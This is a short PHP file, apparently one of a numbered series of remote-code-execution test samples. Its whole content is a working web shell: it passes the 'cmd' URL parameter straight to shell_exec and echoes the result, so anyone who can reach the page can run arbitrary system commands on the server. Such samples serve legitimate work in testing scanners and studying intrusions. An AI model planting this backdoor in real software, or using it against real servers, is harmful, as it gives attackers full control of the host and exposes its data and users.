<?php
// RCE test variation #585
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>